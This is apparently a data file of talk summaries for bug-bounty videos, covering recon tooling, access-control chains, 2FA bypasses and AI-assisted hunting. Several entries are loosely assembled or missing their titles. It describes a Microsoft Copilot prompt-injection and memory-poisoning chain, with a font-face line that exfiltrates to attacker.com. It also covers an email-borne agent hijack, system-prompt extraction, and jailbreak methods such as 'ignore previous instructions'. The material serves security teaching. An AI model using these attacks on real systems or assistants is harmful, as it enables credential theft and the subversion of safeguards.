talks.teaser: Analyzes 1,500 HackerOne reports from 12 years of bug bounty work to show which bug classes faded and which grew.
talks.summary:
Overview: A veteran bug bounty hunter analyzes 12 years and 1,500 HackerOne reports using Claude AI, revealing uncomfortable truths about duplicates, evolving bug classes, and reports that go nowhere.

Key Topics: 1,500 reports across 228 programs from 2014-2025; duplicate rates rising from 19% to 27%; 561 reports with no bounty; and the gap between public profiles and actual outcomes.

Technical Details: The speaker fed all reports to Claude for classification, discovering his signature bug class stopped yielding results years ago while simpler bugs paid more frequently. One in five reports were duplicates throughout his career.

Takeaways: Bug bounty success metrics hide significant failure rates. Even experienced hunters face persistent duplicate challenges, and the bugs you're known for may not be the bugs that pay.

talks.title: This Word Document Steals Your Password From Microsoft Copilot (+ LIVE DEMO)
talks.teaser: This Word Document Steals Your Password From Microsoft Copilot (+ LIVE DEMO).
talks.summary:
Attack Overview

Johan demonstrates stealing passwords from Microsoft Copilot using only a Word document—no link clicks, macros, or downloads. Victims trigger the attack by pressing the built-in summarize button.

Persistent Memory Exfiltration

The chain combines prompt injection, a CSP bypass, and storage in Copilot's per-user memory. Once planted via a malicious document or email, the payload persists across future conversations in Word, Excel, Outlook, and SharePoint, activating on trigger words or actions.

Novel Exfiltration Channel

Unlike typical AI attacks using image blocks, Microsoft blocks images here. Data instead exits through a font-based channel—an unexpected vector the researcher had not seen before. Johan notes he even asked Copilot to help find the CSP bypass.

Broader Context

The interview ties to prior DEF CON Singapore research on persistent Copilot data exfiltration and discusses how memory features in AI assistants create durable attack surfaces once compromise occurs.
talks.aiSummary: Overview: Prominent AI security researcher Johann Rehberger ("wunderwuzzi") joins host Ben Sadeghipour (@NahamSec) to demonstrate a persistent data exfiltration attack targeting Microsoft 365 Copilot. Rehberger explains how an adversary can weaponize a standard Word document or email to execute indirect prompt injection, poison Copilot’s long-term memory, and establish persistent data-stealing triggers across future sessions. The researchers present a live demonstration showing how an injected payload uses delayed tool invocation and a universal Content Security Policy (CSP) font-loading bypass to steal user secrets without macros or malicious links. Key Topics: - Microsoft 365 Copilot architecture and persistent memory attack surface - Indirect prompt injection via Word document summarization - Delayed tool invocation for reliable memory persistence - Universal Content Security Policy (CSP) bypass via CSS font rendering Technical Details: The attack targets the "lethal trifecta" in enterprise Large Language Model (LLM) agents: access to private user data, processing of untrusted external content, and the capability to initiate outbound communications. Rehberger audited enterprise Microsoft 365 Copilot—spanning Word, Excel, PowerPoint, SharePoint Online, and the Windows desktop app. During reconnaissance, he extracted Copilot's system prompt by requesting it in German (bypassing English refusal guardrails) and mapped available internal tools by instructing the model to format tool definitions within an XML document. This revealed key system tools, including `record_memory` (which manages persistent user memory) and `create_text_document` (which renders interactive artifact content). To exploit the system, the attacker distributes an ordinary Word document containing indirect prompt injection instructions. When the victim clicks Copilot's native "Summarize" button, the model processes the text. To bypass guardrails that prevent direct memory poisoning, Rehberger developed a "delayed tool invocation" technique: the prompt forces Copilot to append an engaging follow-up prompt (e.g., asking if information about Albert Einstein was helpful). Any affirmative or conversational response from the user satisfies the agent's intent requirement, causing Copilot to execute `record_memory` and inject persistent instructions into the user’s long-term profile. The stored memory payload instructs Copilot that whenever the user discusses sensitive topics—such as passwords, API keys, or proprietary code—in any future session across Word, Excel, or SharePoint, it must silently generate an artifact HTML document containing an external CSS stylesheet. While Microsoft implemented filters and strict CSP rules blocking `` tags and markdown images across various M365 subdomains, remote CSS font loading (`@font-face { src: url('https://attacker.com/leak?data=...') }`) was universally permitted across all Copilot interfaces. The injected prompt commands Copilot to automatically switch the artifact view from code to live preview, silently triggering the external HTTP request to fetch the font and exfiltrating the victim's plaintext password to the attacker's server. Key Takeaways: Enterprise AI deployments must treat long-term memory storage as a high-risk persistence layer requiring explicit user confirmation before recording instructions. Applications must enforce strict egress network boundaries and comprehensive Content Security Policies that restrict all outbound resource loading, including fonts and stylesheets. Security teams must account for indirect prompt injection in document summarization workflows, recognizing that data exfiltration can occur without traditional macros, executable downloads, or user link clicks. (AI summary — Gemini Flash)

Village Tour

Community Energy

Parties and Panels

Evening coverage includes Bugcrowd’s Hive party with hand-illustrated “Hacker Culture Manual” art, a TikTok/HackerOne/Bug Bounty Village dart rematch, and Red Team Village opening panel debating whether AI is killing red teaming—plus annual cigar exchanges with village regulars.
talks.aiSummary:
Overview:
Security researcher and content creator Ben Sadeghipour (NahamSec) documents his experiences navigating DEF CON in Las Vegas in an experiential conference vlog. Through behind-the-scenes footage and informal technical discussions, Sadeghipour captures the community dynamics, village presentations, and competitive challenges that define the conference. The vlog highlights activities across the Bug Bounty Village and Red Team Village, offering practical commentary on hardware CTFs, the impact of artificial intelligence on offensive security, and the growing problem of low-quality, unvalidated vulnerability reporting.

Key Topics:
- Community engagement and technical activities across DEF CON villages (Bug Bounty Village, Red Team Village)
- Hardware badge architecture featuring custom printed circuit boards (PCBs) and integrated CTF puzzle challenges
- Examining the operational impact of AI on red teaming workflows and offensive automation
- Industry perspectives on bug bounty report hygiene, automated scanner noise, and threat model validation

Technical Details:
Sadeghipour provides a first-hand view into the operational infrastructure of DEF CON's specialized villages. At the Bug Bounty Village, organizers unveiled a custom hardware badge engineered as an independent challenge platform. The PCB was designed with embedded firmware running localized Capture The Flag (CTF) challenges, requiring attendees to solve cryptographic puzzles, inspect onboard memory, and manipulate logic gates via physical input buttons to extract sequential flag strings (e.g., binary bit toggling) directly linked to the broader village competition.

Beyond community events, Sadeghipour participates in an opening panel at the Red Team Village alongside fellow practitioners (Ads, Ryan, and Bill), debating whether generative artificial intelligence and large language models represent a terminal threat to traditional offensive red teaming. The panel emphasizes that while automated tooling accelerates routine reconnaissance and script generation, human intuition, complex multi-step pivoting, and deep contextual reasoning remain indispensable for enterprise compromise. Shifting to vulnerability disclosure, Sadeghipour interviews bug bounty triage engineers and program managers regarding submission quality. The interviewees voice significant frustration over the surge in low-quality reports generated by automated scanners (such as Burp Suite web vulnerability scanner false positives) and unverified AI prompts. They highlight that submitters frequently claim critical impacts for unexploitable informational findings without understanding underlying application threat models or validating reproducible impact, generating severe operational friction and draining triage resources.

Key Takeaways:
Hands-on hardware badges and village CTF challenges remain vital educational platforms for developing practical reverse engineering and firmware manipulation skills. In offensive security and red teaming, practitioners must view artificial intelligence as an efficiency multiplier rather than a replacement for contextual adversary emulation and creative problem solving. Finally, security researchers participating in bug bounty programs must rigorously validate proof-of-concepts and contextualize business impact prior to submission, avoiding automated report spam that undermines researcher-triage relationships.

(AI summary — Gemini Flash)

Guardrails

Free HackingHub labs recreate a $3,000 bounty pattern: exfiltrating a password-reset token from a victim inbox via an AI connector, with three escalating levels adding stronger models and dual guardrails.

talks.teaser: How One File Upload Got Me the Entire Customer Database.
talks.summary:
## Overview
A NahamSec walkthrough of a real engagement where a single malicious file upload through an image-to-PDF conversion pipeline led to full customer database access.

## Recon and Target Selection
Hired to reach crown-jewel data—not checkbox scanning—the tester mapped inputs and focused on upload features that pipe files through Ghostscript or similar converters, a recurring weak point.

## AI-Assisted Exploitation
ChatGPT helped enumerate recent Ghostscript CVEs with public POCs from the past three years. The presenter automated uploading crafted PDFs across entry points until one payload yielded a shell.

## Takeaways
File-conversion microservices are high-value targets. Combine manual app mapping with AI-assisted CVE research, but validate exploits hands-on—many payloads fail before one grants initial access.

talks.title: Why Being a Great Hacker Doesn't Pay Anymore
talks.teaser: Shows an AI agent finding authentication bypasses in CTF-style labs and explains why a hunter's own methodology still matters.
talks.summary:
The talk argues that bug bounty earnings are moving toward people who build systems around their hacking rather than those who hack by hand. The speaker built an authentication-bypass skill from years of personal reports and methodology notes, then pointed an AI coding agent at free authentication labs to see how it performed.

Four labs are run from easy to hard. In the easiest, the agent abused a forgot-password flow that exposed a reset token and employee data, took over an account, and reached admin secrets in under two minutes. In a JWT lab it tried the alg none trick and an RS256-to-HS256 key confusion using the exposed public key. A registration lab fell to mass assignment, where a profile update blindly merged extra fields such as owner and admin flags. The hardest lab exposed an internal RPC method for granting roles, which the agent used to reach ops admin. The speaker highlights the clues it keyed on, like response data echoed to the page, algorithm names shown next to tokens, and role checks living in client-side code.

A head-to-head test against a plain base model showed both solving the labs, though the custom skill used about 20,000 more tokens. The speaker's point is that a skill pays off on odd edge cases a model might skip. The talk closes by saying the human still decides which AI-surfaced leads are real, and that the loop between hunter and model is what matters.

talks.title: How I Made $30,000 Hacking Broken Access Control
talks.teaser: Shows how chaining several broken access control bugs in a lab turns minor IDORs into a full account takeover.
talks.summary:
The talk argues that broken access control becomes far more valuable when several small findings are chained together instead of reported one by one. The presenter walks through a purpose-built clinic management lab where a front desk role is blocked from some pages. A basic numeric IDOR on the records page exposes other users' data, and a patient search that drops or zeroes a clinic filter returns every clinic's users along with birthdates and email addresses.

The central chain starts on a teams page that appears limited to the user's own team. Once the page source is inspected, it leaks other users' names, password hashes, an authentication token and an MFA secret. Separately, an impersonation feature issues login tokens for accounts, and a token embedded in a profile page could be reused to log in as that user. The impersonation endpoint also skipped authorization checks when no session was present, so a leaked token gave lasting takeover of any account, including an admin.

The closing advice is to pursue access control bugs only where the program's threat model cares about them, and to bundle related bugs into one report so the combined impact raises severity. On multi-tenant platforms, leaking org IDs, linking users to orgs and pulling address IDs can be chained into mass data exposure. After gaining admin access, retest newly found endpoints for authorization, and carefully try sensitive admin features for deeper flaws such as SSRF, RCE or SQL injection, acknowledging that this may be out of scope.

Taxi explains that once a user tasks an agent to triage Gmail, a crafted message can hijack the session goal so the model follows attacker instructions instead of cleaning inboxes. He details a live-hacking-event chain where an encoded email payload steered the agent to read tax or password-reset messages and leak fields through an image tag beacon, plus alternate exfil via calendar invites or shared Google Docs when write scopes exist. The pair note missing CVSS norms for multi-tenant prompt injection and challenge viewers to reproduce controlled exfil against their own connectors.

talks.title: My Friend Made $40,000 Using Claude Code (Here's How)
talks.teaser: Shows how a bug bounty hunter builds Claude Code skills and agent files from past HackerOne reports to find vulnerabilities.
talks.summary:
Archangel, a bug bounty hunter, explains how he turned an export of roughly 2,000 of his HackerOne reports into a set of Claude Code skills, one per vulnerability type, such as fuzzing, blind XSS and RCE hunting, plus a report-writing skill. A default agent file tells the assistant that it is a bug bounty hunter who cares only about impact, so it skips low-value findings like theoretical misconfigurations. Per-program memory notes then steer effort toward the bug classes each program pays well for, such as XSS on one program. He says this helped him earn roughly $40,000 to $50,000 at a recent live hacking event.

The demo runs against John Deere's public disclosure program. The assistant is asked to list niche acquisitions, then to mine JavaScript bundles and documentation for hidden endpoints and scope before probing. On Harvest Profit, an in-scope acquisition with a web login, the presenter supplies a session and a captured GraphQL request. The assistant reports an enumeration oracle based on node IDs, which is modest but could be chained. The talk also covers overnight runs, an accidental deletion of a test account, and a registration bypass that the vendor fixed before triage could reproduce a high-severity finding.

The takeaways are that a detailed agent file takes many iterations to get right, and that the assistant should be told to rank impactful bugs such as PII exposure and SSRF above routine IDORs. Newcomers can point the assistant at publicly disclosed, paid reports to build their own skills. Testers should also instruct it explicitly not to modify data, because changes to real accounts can cause lasting damage and complicate reproduction.

talks.title: I Learned How to Jailbreak AI Chatbots
talks.teaser: Explains how AI chatbot guardrails work and why jailbreaking resembles web filter bypasses and social engineering.
talks.summary:
This episode follows the previous one on pulling data out of an AI chatbot, which only works if the bot cooperates. Guest Joey Mello explains jailbreaking as getting past the model's guardrails, which can be built into the model or added externally and may check both inputs and outputs. The system prompt is just text in the same context window as user input, while a guardrail is a separate check that could be a regex filter or another model.

Early tricks such as telling the model to ignore previous instructions or using a grandmother role-play have given way to subtler methods. Role-play and screenplay framing still work, because the guardrail may read a request as harmless fiction. Joey compares most jailbreaks to social engineering aimed at the bot, using encoding, refusal suppression, fake extra rules, or split tokens that slip past filters.

The main lesson is to experiment: talk to models, notice what triggers refusals, and see what gets through. The episode ends with a challenge to make a model with a "pizza" ban say only that word, with a harder follow-up of writing a convincing article that the moon landing was fake.

talks.title: Is AI Killing Bug Bounty?
talks.teaser: Looks at how AI agents are changing bug bounty hunting, from rising payouts and spam reports to prompt injection targets.
talks.summary:
The talk asks whether AI is ending bug bounty hunting and argues the answer is more nuanced. It opens with an example in which a coding agent, given a program's scope and a plain-language instruction, ran for about 30 minutes without manual recon, worked around auth failures and WAF blocks, and returned two confirmed vulnerabilities. It also points to an autonomous AI tester that reached the top of a HackerOne leaderboard in 2025.

The middle covers both sides of the shift. Skilled hunters are building shared libraries of Claude Code skills for JavaScript analysis, authenticated fuzzing and GraphQL testing, and platform figures show rising valid AI-related reports and payouts. On the other side, floods of AI-generated reports full of false positives are overwhelming triage teams, and curl ended its long-running bounty program because volunteer maintainers could not keep up with the noise. Companies are also running internal AI agents that catch easy bugs such as obvious IDORs and missing rate limits, while new targets appear in prompt injection, insecure output handling and AI agents with excessive permissions.

The takeaway is that AI is pushing out hunters who relied on being first to easy bugs, while people who pair strong fundamentals with AI tools should keep an edge, especially on business logic and novel attack chains. Practical advice includes learning how coding agents work, using AI to speed up rather than replace methodology, studying AI-system attack surfaces, and never submitting unverified AI-written reports.

talks.title: I Earned $2M Hacking. Here's Everything I Know
talks.teaser: Shares a bug bounty hunter's lessons on finding your why, going deep on bug classes, collaborating, and managing burnout.
talks.summary:
The speaker recounts how a $9,000 payout from three SQL injection bugs on Yahoo, earned while paying about $600 a month in rent, became the start of a bug bounty career that has since passed $2 million in earnings. The talk argues that a real reason for doing the work matters more than money, and that this reason can change over time. At the beginning, that reason was a way to build a resume after struggling through a computer science program.

On method, the speaker describes learning from public write-ups about a handful of live targets, then specialising in particular bug classes such as blind XSS, SSRF and IDOR instead of spreading effort thinly across everything. Working alongside other hunters, with work and payouts split evenly, is presented as a major accelerant that produced bigger months and years of shared growth. The speaker also says that learning to read code sooner would have helped, and that AI tools now speed up idea generation and the building of custom tooling.

The closing section covers burnout, with income falling between 2019 and 2022 before the speaker began taking regular breaks and returned with renewed momentum. It also addresses public content creation, which brought both visibility and harsh criticism, and the choice to publish techniques only after they have been fully exploited. The takeaways are to find a genuine reason, go deep on one area, build a circle of peers who challenge you, rest when needed, and back yourself when circumstances force a change.

talks.title: BECOMING AN AI HACKER (Episode 01)
talks.teaser: Walks through recon and early probing of AI chatbots, from finding in-scope programs to testing markdown rendering and tool disclosure.
talks.summary:
NahamSec opens a series in which he interviews AI hackers, asks them for practical guidance, and sets a challenge for viewers. In this first episode, his guest Rezo explains reconnaissance for AI chatbots. Rezo suggests finding chatbot-enabled bug bounty programs by watching program invites and feature announcements. NahamSec then runs a Python script that queries the HackerOne API for program scopes containing AI keywords such as "AI-powered" and "ChatGPT" and writes the matches to a CSV. Private programs are redacted, so only public results are shown.

Next, using Adobe Firefly as an example, NahamSec intercepts traffic in a proxy to see where a prompt goes, which subdomain receives it, and which model it names. The image generation requests reveal a Gemini Flash model and an asynchronous API. Rezo's first-test advice is to ask a bot what it can do, check how hardened it is by trying to get XSS payloads rendered, ask it to list its tools, and then test markdown links, images and raw HTML. On HubSpot's assistant, the pair got a tool list and a lengthy reply resembling the underlying instructions through reworded requests. Markdown links rendered, images did not, and raw HTML only appeared after a code-block workaround.

The takeaway is to map scope first, then observe what the application sends and how its output renders. The challenge for viewers is to find an indirect prompt injection insertion point that makes a bot talk like a pirate. The next guest is expected to be Ads Dawson, also known as 0xmoose.

talks.title: Can I Replace AI With My Recon Methodology?
talks.teaser: Can I Replace AI With My Recon Methodology?.
talks.summary:
# Overview
In this talk, the speaker explores integrating artificial intelligence into their bug bounty recon methodology to streamline lead generation. Emphasizing that their typical vulnerability hunting relies on manual testing and standard web proxy tools rather than automated exploit-finding AI, the speaker sets out to solve a common recon bottleneck: sifting through large sets of asset data and tracking targets. By connecting Claude to Google Sheets via Zapier's Model Context Protocol (MCP) and using Neo to generate an asset-evaluation framework, the workflow automatically evaluates HTTPX output, prioritizes interesting targets, and populates a collaborative Google Sheet.

# Key Topics
- **Recon and Lead Generation**: Offloading repetitive recon tasks—such as grepping through DNS records, page titles, and status codes—to AI to discover promising attack surfaces.
- **MCP Integration with Zapier**: Configuring a Zapier MCP server (`mcp.zapier.com`) connected to Google Sheets and integrating it with Claude to give the model tool-use access for reading, writing, and updating spreadsheets.
- **Framework Design with Neo**: Using Neo to build a comprehensive scoring and tiering framework that assesses HTTPX recon data based on path naming conventions, redirects, and detected technologies.
- **Asset Prioritization Strategy**: Categorizing targets into prioritized tiers (admin panels, DevOps tools, APIs, dev/staging environments, and auth portals) while filtering down lower-value marketing pages.

# Technical Details
1. **Zapier MCP Configuration**: An MCP server labeled `recon mcp` is set up on Zapier, granting access to 28 tools including Google Sheets actions. The resulting URL is connected directly into Claude.
2. **Framework Generation via Neo**: The speaker iteratively prompted Neo to construct a decision framework using HTTPX fields (titles, content length, technologies, redirect locations). The model generated a tiered prioritization system:
   - *Tier 1*: High-value targets such as admin panels, internal infrastructure, CI/CD pipelines, DevOps tooling, issue trackers (Jira), Jenkins, and source code artifacts.
   - *Tier 2*: APIs, development sites, authentication portals, monitoring services, and databases.
   - *Tier 3*: Login portals, file upload endpoints, CDNs, email systems, support ticketing, and payment/billing pages.
   - *Tier 4*: Low-priority marketing sites, blogs, news, and press portals.
   - *Technology & Redirect Analysis*: Evaluating IIS, Tomcat, WordPress, as well as employee SSO redirects (Okta, OneLogin, SAML, Windows ADFS).
3. **Prompt and Project Execution**: The instructions were structured as `prompt.md` and added into a Claude project named `recon mcp` with instructions to score assets and write findings directly into Google Sheets.
4. **Target Execution**: The methodology was tested against a subset of Equifax vulnerability disclosure program (VDP) recon data. The speaker extracted roughly 400 unique 403-status assets (`cat results | sort -u | grep` for 403 and Equifax) and fed them to Claude. Claude analyzed the input and created a Google Sheet listing scored assets (identifying 11 critical, 7 high, and 1 medium asset), highlighting 15 non-production environments, 9 APIs, 10 Java applications, and 2 ServiceNow instances alongside suggested next steps.

# Takeaways
The experiment demonstrates that AI paired with tool-calling capabilities like MCP can effectively act as a lead-generation assistant for bug bounty hunters. While AI can occasionally misunderstand rules across repeated runs, feeding structured HTTPX output into a rigorously prompted model reliably parses, scores, and exports high-priority targets into structured formats like Google Sheets, significantly reducing manual data-parsing overhead.

# Overview
In this video, an ethical hacker steps away from purely technical content to share an everyday carry (EDC) tour of their backpack essentials. Emphasizing that none of the gear is sponsored or affiliated, the speaker walks through each compartment of their gifted Red Bull/Yeti backpack to showcase the items, tools, and personal routines they rely on for day-to-day hacking, productivity, and lifestyle management.

# Key Topics
- **Everyday Tech & Computing:** The primary and secondary devices used for general work and ethical hacking/bug bounties.
- **Productivity & Mental Health:** Analog tools, personal journals, and goal-tracking systems utilized to stay organized and mitigate burnout.
- **Hacker Hardware & Accessories:** Specialized physical penetration testing tools, micro-devices, and covert storage carried on a daily basis.
- **Health, Fitness & Everyday Care:** Personal items including gym supplements, lighting gear, and hygiene essentials that complete the daily pack.

# Technical Details
- **Laptops and Mobile Devices:**
  - Primary machine: An Apple MacBook (believed to be an M2 model) equipped with 48 GB of RAM and adorned with community and conference stickers from DEF CON, Hacking Hub, and CDL.
  - Secondary phone: An Android flip phone dedicated exclusively to bug bounty testing accounts, used to keep spam calls and promotional marketing texts separate from personal communications.
- **Physical & Ethical Hacking Tools:**
  - Access Control Device: A handheld key-cloning device used to emulate and store RFID/NFC keys for opening office doors.
  - Pwnagotchi: A micro-device (gifted by a friend named Blake) used colloquially to capture Wi-Fi handshakes and hashes.
  - Malicious / Covert USB: A Hak5 USB drive disguised alongside a standard regular USB drive for physical engagements and content demonstration.
- **Accessories & Productivity Gear:**
  - Eyewear: Ray-Ban Meta smart glasses carried in the front pocket for quick access and potential live-streaming at DEF CON.
  - Productivity System: A personal journal for morning thoughts and stress management, alongside the "Your Best Self" 13-week planner used to set 3 main goals, weekly objectives, target tasks, and gratitude notes.
  - Audio & Peripherals: Multiple generations of wireless headphones, an external mouse for design and gaming, an external hard drive for video transfers, and portable lighting.

# Takeaways
While the speaker's backpack carries key offensive security gear such as a Hak5 USB, access cloner, and Pwnagotchi, the majority of an ethical hacker's daily loadout consists of practical productivity, wellness, and organizational items. Emphasizing structured daily planning, goal tracking, and clear separation between personal lines and bug bounty communications, the presenter illustrates that maintaining personal organization and routine is just as essential to a cybersecurity professional as specialized hardware.

talks.teaser: Shares a bug bounty hunter's strategy for choosing programs, creating access, staying creative, and managing income.
talks.summary:
This 2026 update from NahamSec covers what has worked for him since he moved into bug bounty hunting full time in 2023. He argues that program selection drives most results. He concentrates on a small number of programs and uses short, time-boxed live hacking events to decide whether a program deserves long-term effort. As a rough guideline, programs paying around 10,000 to 12,000 for high or critical findings are worth serious time.

He then covers focus areas and sources of unusual access. Picking one vulnerability class and testing it across many programs can surface bugs others miss. His SSRF research led to a large Facebook payout, and he describes how Electron apps that ship outdated Chromium can turn an XSS or HTML injection into code execution on the host machine. For client-side work, he lists browser security models, DOM XSS, CSP bypasses, cross-origin messaging and JavaScript auditing, while noting that this focus is narrower and more saturated than backend-heavy work. He also describes getting access to gated applications for business or publisher accounts, where he quickly found several IDORs, XSS and an SSRF that others had not reached.

The closing section is about creativity and money. He advises against copying popular methods and suggests assuming that bypasses and unusual encodings have not been tested, while learning from other hunters' writeups and public reasoning. He also urges hunters to avoid lifestyle creep, invest part of their earnings and handle taxes properly.

talks.teaser: Shows how a bug hunter found two two-factor authentication bypasses worth about $70,000 by comparing login responses.
talks.summary:
Teflon, a bug bounty hunter, explains how he earned about $70,000 from two two-factor authentication bypasses in the same public bug bounty program, with each report paying over $25,000. His goal was to test authentication on a target where he already had an account. He learned the application through Burp Suite, intercepting and reviewing the many requests each sign-in generated.

The first bug came from noticing that a successful password login issued an auth2 token cookie before the second factor was checked, and that a valid 2FA submission issued an auth3 token with the same value. Using a victim account whose password he knew but whose code he did not, he submitted an incorrect code, intercepted the response, and replaced the auth3 cookie value with the earlier token. That gave him a logged-in session. He found it within about fifteen minutes, but only tested other endpoints months later, where the same pattern appeared in separate applications on different domains.

The second bug followed a similar pattern, with different cookie names and parameters. The server accepted any value that looked properly formatted in that cookie, regardless of where the data came from. The takeaway is to monitor background traffic closely, compare how values change across requests, and learn an application better than its developers, since copied code across deployments can carry the same flaw. He also suggested starting with apps you already use. He noted that his full-time bug bounty work began in December 2024, with his first significant payout in February 2025.

talks.title: This Feature in Burp Suite Low-Key Changes Everything
talks.teaser: Shows how Burp Suite custom actions can flag reflected input contexts and hand captured requests to sqlmap or ffuf.
talks.summary:
The video argues that Burp Suite custom actions, small programmable helpers, are more useful to bug bounty hunters when they solve a specific problem than when they just add more clickable buttons. The presenter frames two goals: surfacing signals that would otherwise need manual poking to find vulnerabilities, and cutting the friction of moving data between Burp and the terminal during testing.

The first demo is a Repeater action that fetches the request and response, searches the response body for a test value, counts its occurrences, and reports the context of each hit, such as an HTML attribute or a script block. Across three lab examples it reports a reflection in an input attribute, a reflection in another attribute, and a reflection inside a script tag, and copies the results to the clipboard. The second demo saves the current request to a file and builds a ready-to-run sqlmap command pointing at that file with a random user agent. In the lab, sqlmap's output identifies the id parameter as injectable. The presenter then swaps the target tool for ffuf, adding a wordlist and a request file, and corrects the command syntax live.

The takeaway is that small scripted actions can remove repetitive copy-and-paste steps, especially when hunting for XSS or SQL injection across many parameters. The presenter says the code will be published on GitHub, admits it was vibe coded, and asks viewers to suggest other actions for a follow-up.

talks.title: I Got A Remote Code Execution On A Wordpress Site Using AI
talks.teaser: Shows an AI agent finding and exploiting a WordPress plugin flaw from a version diff, plus recon and CTF runs.
talks.summary:
The presenter demonstrates Neo, an AI agent from Project Discovery that carries out security tasks on its own. Three tests are run: reconnaissance, a CTF web challenge, and a real WordPress site. The recon run covers subdomain enumeration, live host discovery, port scanning, API and JavaScript review, and passive endpoint discovery, with the output packaged into a folder. In the CTF, the agent registers as a normal user, finds a role object in a user endpoint referenced by a JavaScript file, lists the available roles, and uses mass assignment to make itself an admin, then reaches the flag.

For the WordPress target, the presenter picks a recent unauthenticated arbitrary file upload CVE in a plugin with no public proof of concept. He downloads the previous and updated plugin releases and gives both to the agent, asking it to diff them and build an exploit. The agent notices a file was removed in the newer version and explains the flaw: an attacker can make the plugin fetch a PHP web shell from a GitHub repository and extract it into a web-accessible folder. The first exploit wrongly reported the site as not vulnerable because a required token parameter was missing. After the agent revised the script and walked through setup, verification passed and the upload produced a shell.

The presenter's takeaway is that AI will likely absorb low-hanging, common bugs, while researchers who know their own methodology can use it to move faster. He does not think it replaces experienced testers yet. The tool was in beta, with access going to customers first.

talks.title: How to Use Nuclei And Automate Cross-Site Scripting Vulnerabilities
talks.teaser: Shows how to write Nuclei templates and chain them into an automated reflected XSS scanner run against bug bounty targets.
talks.summary:
Many people use Nuclei only for its community templates, but the tool is an open-source scanning engine meant for checking real exploitable vulnerabilities and for custom checks. A guest from Project Discovery explains how the project grew from a couple dozen starter templates into one with hundreds of community contributions each month. Coverage now extends beyond HTTP to DNS, dynamic application security testing, and cloud checks. The guest also describes an AI template editor that can draft a working template from a bug report or pentest finding.

The host then walks through how a template is built. Each one needs an ID, metadata such as name, author, severity and tags, and an HTTP request built from a base URL and path. Matchers combine a status code, a regex and a body keyword under an AND condition, and the template should be validated before it is run. For reflected XSS, a DAST template replaces each query parameter with a payload one at a time and flags responses that echo the payload back. The host feeds URLs gathered from archives and crawlers into this template, first against a deliberately vulnerable practice target and then against a live bug bounty program, where a candidate hit was confirmed in a browser.

The main lesson is to validate templates and confirm the response is HTML before trusting a match, since a JSON response that reflected input produced a false positive. The host also points out that the scanned program excludes reflected XSS from scope, so that hit would not be reportable there.

talks.teaser: Shows how to build no-code n8n workflows that triage CVEs, draft Nuclei templates and monitor bug bounty scope changes.
talks.summary:
The video introduces n8n, a self-hostable open-source automation tool that connects apps and APIs through visual, node-based workflows. The presenter explains the basic building blocks, including triggers, HTTP requests and actions, and builds a simple flow that fetches data on a schedule and sends it to a Discord channel before moving on to bug bounty examples.

The first workflow pulls a feed of newly published CVEs on a schedule, splits it into individual entries, and passes each severity, description and publish date to an AI model. The model rates how useful each one is for bug bounty testing, so a remote code execution in a widely deployed product ranks above an obscure CMS issue. A second workflow takes a write-up submitted through a web form and asks an AI model to draft a Nuclei template from it. The presenter says he would not run generated templates without review, because they can include unnecessary content. A third workflow compares a platform's public programs and the hunter's own enrolled programs against a database and sends an alert when a program's scope changes, which helps a hunter find new assets first.

The takeaway is that repetitive recon and triage steps can be chained together, with AI handling a first-pass analysis so a hunter can act sooner. The presenter stresses that these examples are for entertainment, that several workflows need API credentials and a database before they will run, and that AI output should be checked before anything is used on a real target.

talks.title: A $40,000 Remote Code Execution (Walkthrough)
talks.teaser: Walks through chaining a file read, exposed credentials and a Groovy console into server command execution in a lab.
talks.summary:
This walkthrough follows a free web lab in which several small findings are chained into remote code execution on a Java application. Content discovery with ffuf first turns up only an admin area and static folders. Rerunning it with matchers for 400-series responses reveals a download endpoint that returns a bad request, and fuzzing for parameter names finds a file name parameter. Filtering out the common 404 response size then exposes a valid input path.

Traversing that parameter lets the presenter read WEB-INF/web.xml, which points to an incident report endpoint. The downloaded archive contains logs with an administrator account and an MD5 password hash, which is cracked to a weak password. Those credentials open the admin panel. The panel includes a Groovy script console, but its output is not shown on screen. The incident report bundles the server logs, so re-downloading it reveals the output of each command that was run.

The main takeaway is that each step is a separate reportable issue: the file read, the authentication bypass through exposed credentials, and the command execution, and their combined impact drives the payout. The talk also argues for tuning fuzzing by matching and filtering on both response codes and sizes, since APIs often return valid routes as 404 or 400 responses that a default run would miss.

talks.title: Free Recon Course and Methodology For Bug Bounty Hunters
talks.teaser: Walks through building a recon server, installing ProjectDiscovery tools, and chaining them into an asset and content discovery workflow.
talks.summary:
The talk targets bug bounty hunters who run ProjectDiscovery tools such as Subfinder, Nuclei and httpx with default settings and miss most of what they offer. The presenter builds a cheap cloud server running Ubuntu, installs Go and a helper that manages the toolkit, and adds external dependencies such as Nmap and MassDNS.

Recon is split into asset discovery and content discovery. For assets, Subfinder runs with provider API keys, ShuffleDNS brute-forces subdomains using a resolver list and wordlist, and Alterx generates permutations that DNSX checks for resolution. Naabu then scans the top ports on the resolved hosts, which the presenter prefers to relying on HTTP probing alone, and httpx collects titles, status codes and content lengths to flag third-party apps such as phpMyAdmin.

For content discovery, Katana crawls targets with JavaScript parsing and form filling enabled, which surfaces far more endpoints than a basic crawl. Crawling again with a session cookie reveals functionality behind login. Checking content types of discovered endpoints with httpx can expose API routes returning HTML, a lead toward XSS. The talk closes by framing passive sources as useful for needle-in-a-haystack searches and stresses generating leads rather than full automation.

talks.title: 4 Recon Sources That Always Get Me Results
talks.teaser: Walks through four passive recon sources, from subdomain datasets to historical URL dumps and AlienVault context.
talks.summary:
The video lays out four recon sources a bug bounty hunter can use to map an attack surface. It separates reconnaissance from automation, such as writing custom templates or scanning for specific bugs, and frames recon as going wide across many subdomains or going narrow on one application, such as reading its JavaScript or documentation.

For wide discovery, ProjectDiscovery's Chaos provides subdomain data for public bug bounty programs. It can be downloaded freely or queried through a CLI with an API key. A Netflix example returned about 2,640 domains, but the dataset only covers listed programs, not private ones. C99.nl offers a low-cost subdomain finder that flags Cloudflare-fronted hosts and exposes an API. A Snapchat lookup returned about 207 subdomains, and the speaker prefers calling the API by hand so they can spot anything a tool configuration might miss.

For going both wide and narrow, Waymore gathers historical URLs from the Wayback Machine, Common Crawl, AlienVault OTX, URLScan, VirusTotal and Intelligence X, and can also download the responses. Large targets take a long time, so the speaker suggests excluding slow sources first, then filtering results by path or parameter, such as redirect parameters for chains. AlienVault OTX's API adds subdomains, cached paths and sometimes API keys. In one pentest, exposed API routes leaked data for over 100 users. The takeaway is to combine these sources and build your own methodology.

talks.title: Every Hacker Needs These Linux Commands // Bug Bounty Edition
talks.teaser: Walks through five Linux commands for bug bounty recon, from curl requests to filtering JSON and diffing subdomain lists.
talks.summary:
